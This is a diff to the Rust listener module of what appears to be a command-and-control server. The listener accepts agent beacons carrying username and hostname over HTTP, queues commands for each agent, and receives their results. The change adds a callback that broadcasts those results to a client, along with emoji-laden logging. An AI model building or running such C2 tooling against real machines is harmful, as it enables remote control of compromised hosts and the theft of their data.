@@ -1,4 +1,4 @@
-// src/listener/mod.rs - Fixed with real command execution
+// src/listener/mod.rs - Complete working version with command result broadcasting
 use std::io;
 use std::sync::{Arc, Mutex};
 use std::thread;
@@ -83,6 +83,10 @@ lazy_static! {
     static ref PENDING_TASKS: Arc<Mutex<HashMap<String, Vec<AgentTask>>>> = Arc::new(Mutex::new(HashMap::new()));
     static ref TASK_RESULTS: Arc<Mutex<HashMap<String, Vec<TaskResult>>>> = Arc::new(Mutex::new(HashMap::new()));
     static ref AGENT_DIRECTORIES: Arc<Mutex<HashMap<String, String>>> = Arc::new(Mutex::new(HashMap::new()));
+    
+    // 🎯 CRITICAL FIX - Simple callback system for command results
+    static ref RESULT_CALLBACK: Arc<Mutex<Option<Box<dyn Fn(String, String, String, String, bool) + Send + Sync>>>> = 
+        Arc::new(Mutex::new(None));
 }
 
 #[derive(Clone)]
@@ -119,14 +123,14 @@ impl Listener {
         let running = self.running.clone();
         
         thread::spawn(move || {
-            println!("Starting {:?} listener on {}:{}", config.listener_type, config.host, config.port);
+            println!("🚀 Starting {:?} listener on {}:{}", config.listener_type, config.host, config.port);
             
             match config.listener_type {
                 ListenerType::Http | ListenerType::Https => {
                     let rt = Runtime::new().unwrap();
                     rt.block_on(async {
                         if let Err(e) = start_http_server(&config, &running, &rx).await {
-                            eprintln!("HTTP server error: {}", e);
+                            eprintln!("❌ HTTP server error: {}", e);
                         }
                     });
                 },
@@ -138,7 +142,7 @@ impl Listener {
                 }
             }
             
-            println!("{:?} listener stopped on {}:{}", config.listener_type, config.host, config.port);
+            println!("⏹ {:?} listener stopped on {}:{}", config.listener_type, config.host, config.port);
         });
         
         Ok(())
@@ -167,6 +171,26 @@ impl Listener {
 impl Drop for Listener {
     fn drop(&mut self) {
         let _ = self.stop();
+    }
+}
+
+// 🎯 CRITICAL FUNCTIONS - Callback system for command results
+pub fn set_result_callback<F>(callback: F) 
+where 
+    F: Fn(String, String, String, String, bool) + Send + Sync + 'static 
+{
+    let mut cb = RESULT_CALLBACK.lock().unwrap();
+    *cb = Some(Box::new(callback));
+    println!("📡 LISTENER: Result callback registered");
+}
+
+pub fn notify_command_result(agent_id: String, task_id: String, command: String, output: String, success: bool) {
+    let cb = RESULT_CALLBACK.lock().unwrap();
+    if let Some(ref callback) = *cb {
+        println!("📡 LISTENER: Executing callback for task {}", task_id);
+        callback(agent_id, task_id, command, output, success);
+    } else {
+        println!("⚠️ LISTENER: No callback registered for result notification");
     }
 }
 
@@ -202,7 +226,7 @@ pub fn add_task_for_agent(agent_id: &str, command: String) -> String {
     let mut pending = PENDING_TASKS.lock().unwrap();
     pending.entry(agent_id.to_string()).or_insert_with(Vec::new).push(task);
     
-    println!("Added task {} for agent {}", task_id, agent_id);
+    println!("📋 LISTENER: Added task {} for agent {}", task_id, agent_id);
     task_id
 }
 
@@ -232,7 +256,7 @@ async fn start_http_server(
         .map_err(|e| format!("Invalid address: {}", e))?;
     
     let listener = tokio::net::TcpListener::bind(&addr).await?;
-    println!("HTTP listener bound to {}", addr);
+    println!("🌐 HTTP listener bound to {}", addr);
     
     loop {
         if !running.load(Ordering::SeqCst) {
@@ -248,15 +272,15 @@ async fn start_http_server(
             result = listener.accept() => {
                 match result {
                     Ok((stream, addr)) => {
-                        println!("Connection from: {}", addr);
+                        println!("🔗 Connection from: {}", addr);
                         tokio::spawn(async move {
                             if let Err(e) = handle_http_connection(stream, addr).await {
-                                eprintln!("Error handling connection: {}", e);
+                                eprintln!("❌ Error handling connection: {}", e);
                             }
                         });
                     }
                     Err(e) => {
-                        eprintln!("Failed to accept connection: {}", e);
+                        eprintln!("❌ Failed to accept connection: {}", e);
                     }
                 }
             }
@@ -281,7 +305,8 @@ async fn handle_http_connection(
         Ok(0) => return Ok(()), // Connection closed
         Ok(n) => {
             let request = String::from_utf8_lossy(&buffer[..n]);
-            println!("Received HTTP request from {}: {}", addr, request.lines().next().unwrap_or(""));
+            let first_line = request.lines().next().unwrap_or("");
+            println!("📥 HTTP request from {}: {}", addr, first_line);
             
             if request.contains("POST /beacon") {
                 handle_beacon_request(&mut stream, &request).await?;
@@ -294,7 +319,7 @@ async fn handle_http_connection(
             }
         }
         Err(e) => {
-            eprintln!("Error reading from connection: {}", e);
+            eprintln!("❌ Error reading from connection: {}", e);
         }
     }
     
@@ -313,7 +338,7 @@ async fn handle_beacon_request(
         
         match serde_json::from_str::<BeaconData>(body) {
             Ok(beacon) => {
-                println!("Agent beacon: {} ({}@{})", beacon.id, beacon.username, beacon.hostname);
+                println!("🔴 Agent beacon: {} ({}@{})", beacon.id, beacon.username, beacon.hostname);
                 
                 // Update current directory if provided
                 if let Some(ref current_dir) = beacon.current_directory {
@@ -340,7 +365,7 @@ async fn handle_beacon_request(
                             beacon.ip.clone()
                         );
                         agents.insert(beacon.id.clone(), agent);
-                        println!("New agent registered: {}", beacon.id);
+                        println!("✅ New agent registered: {}", beacon.id);
                     }
                 }
                 
@@ -360,11 +385,11 @@ async fn handle_beacon_request(
                 stream.write_all(response.as_bytes()).await?;
                 
                 if !tasks.is_empty() {
-                    println!("Sent {} tasks to agent {}", tasks.len(), beacon.id);
+                    println!("📤 Sent {} tasks to agent {}", tasks.len(), beacon.id);
                 }
             }
             Err(e) => {
-                eprintln!("Failed to parse beacon JSON: {}", e);
+                eprintln!("❌ Failed to parse beacon JSON: {}", e);
                 let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
                 stream.write_all(response.as_bytes()).await?;
             }
@@ -377,6 +402,7 @@ async fn handle_beacon_request(
     Ok(())
 }
 
+// 🎯 CRITICAL FUNCTION - Enhanced task result handler with callback notification
 async fn handle_task_result(
     stream: &mut tokio::net::TcpStream,
     request: &str
@@ -389,13 +415,20 @@ async fn handle_task_result(
         
         match serde_json::from_str::<TaskResult>(body) {
             Ok(result) => {
-                println!("Task result: {} -> {}", result.id, 
-                    if result.success { "SUCCESS" } else { "FAILED" });
-                println!("Output: {}", result.result);
+                println!("📨 LISTENER: Received task result!");
+                println!("   Task ID: {}", result.id);
+                println!("   Command: {}", result.command);
+                println!("   Success: {}", result.success);
+                println!("   Output length: {}", result.result.len());
+                println!("   Output preview: {}", 
+                    if result.result.len() > 200 { 
+                        format!("{}...", &result.result[..200]) 
+                    } else { 
+                        result.result.clone() 
+                    });
                 
                 // Update agent directory if this was a cd command
                 if let Some(ref current_dir) = result.current_directory {
-                    // Extract agent ID from task ID (format: task-{agent_id}-{timestamp})
                     if let Some(agent_id) = extract_agent_id_from_task(&result.id) {
                         let mut dirs = AGENT_DIRECTORIES.lock().unwrap();
                         dirs.insert(agent_id, current_dir.clone());
@@ -404,22 +437,40 @@ async fn handle_task_result(
                 
                 // Store the result for GUI access
                 if let Some(agent_id) = extract_agent_id_from_task(&result.id) {
-                    let mut results = TASK_RESULTS.lock().unwrap();
-                    results.entry(agent_id.clone()).or_insert_with(Vec::new).push(result.clone());
+                    println!("🔍 LISTENER: Extracted agent_id: {}", agent_id);
                     
-                    // Keep only last 100 results per agent
-                    if let Some(agent_results) = results.get_mut(&agent_id) {
-                        if agent_results.len() > 100 {
-                            agent_results.drain(0..agent_results.len() - 100);
+                    {
+                        let mut results = TASK_RESULTS.lock().unwrap();
+                        results.entry(agent_id.clone()).or_insert_with(Vec::new).push(result.clone());
+                        
+                        // Keep only last 100 results per agent
+                        if let Some(agent_results) = results.get_mut(&agent_id) {
+                            if agent_results.len() > 100 {
+                                agent_results.drain(0..agent_results.len() - 100);
+                            }
                         }
                     }
+                    
+                    // 🎯 THE CRITICAL FIX - Notify callback to send result to client
+                    println!("📡 LISTENER: Notifying callback for result broadcast...");
+                    notify_command_result(
+                        agent_id,
+                        result.id.clone(),
+                        result.command.clone(),
+                        result.result.clone(),
+                        result.success
+                    );
+                    
+                    println!("✅ LISTENER: Task result processed and callback notified");
+                } else {
+                    println!("❌ LISTENER: Could not extract agent_id from task_id: {}", result.id);
                 }
                 
                 let response = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK";
                 stream.write_all(response.as_bytes()).await?;
             }
             Err(e) => {
-                eprintln!("Failed to parse task result JSON: {}", e);
+                eprintln!("❌ LISTENER: Failed to parse task result JSON: {}", e);
                 let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
                 stream.write_all(response.as_bytes()).await?;
             }
@@ -434,11 +485,18 @@ async fn handle_task_result(
 
 fn extract_agent_id_from_task(task_id: &str) -> Option<String> {
     // Task ID format: task-{agent_id}-{timestamp}
+    println!("🔍 LISTENER: Extracting agent_id from task_id: '{}'", task_id);
+    
     let parts: Vec<&str> = task_id.split('-').collect();
-    if parts.len() >= 3 {
-        // Join all parts except first and last (remove "task" prefix and timestamp suffix)
-        Some(parts[1..parts.len()-1].join("-"))
+    println!("🔍 LISTENER: Split parts: {:?}", parts);
+    
+    if parts.len() >= 3 && parts[0] == "task" {
+        // Join all parts except first (task) and last (timestamp)
+        let agent_id = parts[1..parts.len()-1].join("-");
+        println!("🔍 LISTENER: Extracted agent_id: '{}'", agent_id);
+        Some(agent_id)
     } else {
+        println!("❌ LISTENER: Invalid task_id format");
         None
     }
 }
